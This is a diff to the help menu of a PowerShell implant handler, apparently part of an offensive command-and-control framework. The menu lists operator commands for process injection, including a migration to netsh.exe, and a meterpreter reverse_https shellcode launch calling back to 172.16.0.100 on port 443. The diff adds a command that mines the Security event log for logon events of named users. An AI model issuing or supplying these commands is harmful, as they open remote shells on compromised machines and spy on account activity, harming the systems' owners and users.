@@ -249,6 +249,7 @@ function Implant-Handler
         write-host " Invoke-PSInject-Payload -ProcID 4444" -ForegroundColor Green
         write-host " Invoke-PSInject-ProxyPayload (migrates to netsh.exe automatically if not procid is passed)" -ForegroundColor Green
         write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
+        write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
         write-host `n "Implant Handler: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
         write-host " Back" -ForegroundColor Green 
